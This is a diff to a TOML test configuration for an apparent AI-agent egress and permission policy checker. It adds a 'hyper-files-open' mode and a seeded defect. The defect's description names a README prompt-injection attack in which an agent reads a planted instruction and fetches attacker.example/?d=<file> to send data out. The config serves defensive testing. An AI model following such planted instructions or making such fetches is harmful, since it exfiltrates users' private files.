@@ -12,9 +12,10 @@
 #
 # A patch that no longer applies is zoo rot: exit 2, never silently skipped.
 #
-# Not in the battery: `--mode hyper --high files`. It is violated on correct code
-# by design (a private read followed by the session's first fetch egresses; see
-# #2946), so it cannot be a mode that must hold.
+# Not in the battery: `--mode hyper --high files --hosts declared`. It is violated
+# on correct code by design, because sending workspace-derived data to a declared
+# host is the principal's choice. With `--hosts open` (no allowlist) it must hold,
+# and it is in the battery as hyper-files-open.
 
 [[mode]]
 name = "linearize-grant"
@@ -23,6 +24,10 @@ args = ["--mode", "linearize", "--policy", "grant", "--clients", "4", "--ops", "
 [[mode]]
 name = "linearize-trifecta"
 args = ["--mode", "linearize", "--policy", "trifecta", "--clients", "4", "--ops", "12"]
+
+[[mode]]
+name = "hyper-files-open"
+args = ["--mode", "hyper", "--policy", "trifecta", "--high", "files", "--hosts", "open", "--ops", "5", "--trials", "30"]
 
 [[mode]]
 name = "hyper-web"
@@ -47,3 +52,8 @@ expect = "killed"
 name = "approval-never-spent"
 origin = "a one-shot approval is checked but never decremented: one human decision buys unlimited operations (the C-4 shape)"
 expect = "survives"
+
+[[defect]]
+name = "private-read-egress-unasked"
+origin = "with no host allowlist, a session that has read private data fetches an undeclared host without asking: the README-injection exfiltration (read a planted instruction, then fetch attacker.example/?d=<file>)"
+expect = "killed"
